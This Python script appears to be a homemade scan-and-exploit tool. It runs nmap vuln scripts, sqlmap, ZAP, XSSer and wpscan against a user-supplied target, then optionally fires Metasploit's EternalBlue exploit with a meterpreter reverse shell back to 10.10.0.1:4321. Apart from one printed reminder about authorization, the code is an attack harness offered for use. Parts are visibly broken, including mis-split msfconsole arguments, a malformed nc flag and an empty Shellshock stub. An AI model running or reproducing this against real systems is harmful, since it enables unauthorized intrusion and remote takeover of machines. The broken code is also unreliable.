import subprocess

class ExternalToolChecker:
    def __init__(self, name, command):
        self.name = name
        self.command = command

    def scan(self):
        try:
            subprocess.run(self.command, check=True)
            print(f"{self.name} check passed.")
        except subprocess.CalledProcessError:
            print(f"{self.name} check failed.")

class Exploiter:
    def __init__(self, target):
        self.target = target

    def check_heartbleed_vulnerability(self):
        print("Checking for Heartbleed vulnerability...")

        # Run the ssltest.py script to check for Heartbleed
        heartbleed_command = ["python", "ssltest.py", self.target]
        try:
            subprocess.run(heartbleed_command, check=True)
        except subprocess.CalledProcessError:
            print("Heartbleed check failed.")

    def exploit_shellshock(self):
        print("Attempting Shellshock exploit...")
        # Add your Shellshock exploit code here

    def exploit_eternalblue(self):
        print("Attempting EternalBlue exploit using Metasploit...")

        # Convert domain to IP if a domain is provided
        if self.target.replace('.', '').isnumeric():
            rhosts = self.target
        else:
            rhosts_command = ["nslookup", self.target]
            try:
                rhosts_output = subprocess.check_output(rhosts_command, universal_newlines=True)
                rhosts = rhosts_output.split()[-1]
            except subprocess.CalledProcessError:
                print(f"Failed to convert {self.target} to IP address.")
                return

        # Run Metasploit with the specified commands
        metasploit_command = [
            "msfconsole",
            "-x", f"use exploit/windows/smb/ms17_010_eternalblue;",
            f"set rhosts {rhosts};",
            "set payload windows/x64/meterpreter/reverse_tcp;",
            "set lhost 10.10.0.1;",
            "set lport 4321;",
            "exploit"
        ]

        nc_command = ["nc", "-lnvpn", "4321"]

        try:
            subprocess.run(metasploit_command, check=True)
            subprocess.run(nc_command)
            print("Exploit successful.")
        except subprocess.CalledProcessError:
            print("Exploit failed.")

    def run_exploits(self):
        self.check_heartbleed_vulnerability()
        self.exploit_shellshock()
        self.exploit_eternalblue()

class VulnerabilityScanner:
    def __init__(self, target):
        self.target = target

    def run_initial_discovery(self):
        print(f"Running initial discovery for {self.target} using Nmap:\n")
        nmap_command = ["nmap", "-sV", "-sT", "-T5", "-A", "--script", "vuln,exploit", self.target]
        subprocess.run(nmap_command)

    def run_scans(self):
        print(f"\nRunning vulnerability scans for {self.target}:\n")

        # Run initial Heartbleed check
        exploiter = Exploiter(self.target)
        exploiter.check_heartbleed_vulnerability()

        # Run initial Nmap discovery
        self.run_initial_discovery()

        # Instantiate external tool checkers
        nmap_checker = ExternalToolChecker("Nmap", ["nmap", "-sV", "-sT", "-T5", "-A", "--script", "vuln,exploit", self.target])
        sqlmap_checker = ExternalToolChecker("SQLMap", ["sqlmap", "--url", self.target])
        zap_checker = ExternalToolChecker("OWASP ZAP", ["zap-cli", "quick-scan", "--self-contained", self.target])
        xsser_checker = ExternalToolChecker("XSSer", ["xsser", "--url", self.target])
        shellshock_checker = ExternalToolChecker("Shellshock", ["nmap", "--script", "http-shellshock", self.target])
        wp_checker = ExternalToolChecker("WordPress Vulnerabilities", ["wpscan", "--url", self.target])

        # Run checks
        nmap_checker.scan()
        sqlmap_checker.scan()
        zap_checker.scan()
        xsser_checker.scan()
        shellshock_checker.scan()
        wp_checker.scan()

        # For active exploitation
        print("\nEnsure you have explicit authorization before attempting exploitation.")
        exploit_decision = input("Do you want to attempt exploitation? (y/n): ")
        if exploit_decision.lower() == 'y':
            exploiter.run_exploits()

        print("\nVulnerability scanning and exploitation completed.")

if __name__ == "__main__":
    target_input = input("Enter the target domain or IP: ")
    scanner = VulnerabilityScanner(target_input)
    scanner.run_scans()
